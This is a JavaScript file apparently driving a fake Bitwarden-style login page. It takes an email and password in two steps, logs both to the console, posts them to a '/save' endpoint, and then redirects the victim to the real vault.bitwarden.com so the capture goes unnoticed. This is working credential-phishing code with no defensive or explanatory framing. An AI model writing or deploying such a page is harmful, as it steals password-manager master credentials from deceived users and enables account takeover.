const svg1 = document.getElementById('svg1');
const svg2 = document.getElementById('svg2');
const emailDisplay = document.getElementById('email-display');
const emailSection = document.getElementById('email-section');
const passSection  = document.getElementById('password-section')
const eyeIcon = document.getElementById('eye-icon');
const emailInput = document.getElementById('email-input');
const passwordInput = document.getElementById('password-input');

document.getElementById('continue-button').addEventListener('click', function() {
    const email = emailInput.value;
    if (!email) {
        return;
    }
    emailSection.classList.toggle('tw-hidden');
    passSection.classList.toggle('tw-hidden');
    svg1.classList.toggle('tw-hidden');
    svg2.classList.toggle('tw-hidden');
    emailDisplay.textContent = email;
});

document.getElementById('back-button').addEventListener('click', function() {
    emailSection.classList.toggle('tw-hidden');
    passSection.classList.toggle('tw-hidden');
    svg1.classList.toggle('tw-hidden');
    svg2.classList.toggle('tw-hidden');
});

document.getElementById('eye-button').addEventListener('click', function() {
    eyeIcon.classList.toggle('bwi-eye-slash');
    eyeIcon.classList.toggle('bwi-eye');

    var isPressed = eyeIcon.getAttribute('aria-pressed') === 'true';
    isPressed = !isPressed;
    eyeIcon.setAttribute('aria-pressed', isPressed.toString());
    if(isPressed) {
        passwordInput.type = "text";
    } else {
        passwordInput.type = "password";
    }
});

document.getElementById('submit-button').addEventListener('click', function(event) {
    event.preventDefault();
    const email = emailInput.value;
    const password = passwordInput.value;
    if (!password) {
        return;
    }
    console.log('Email:', email);
    console.log('Password:', password);

    // send post request to /save
    fetch('/save', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`
    }).then(() => {
        // Redirect after storing data
        window.location.href = 'https://vault.bitwarden.com/';
    });
});
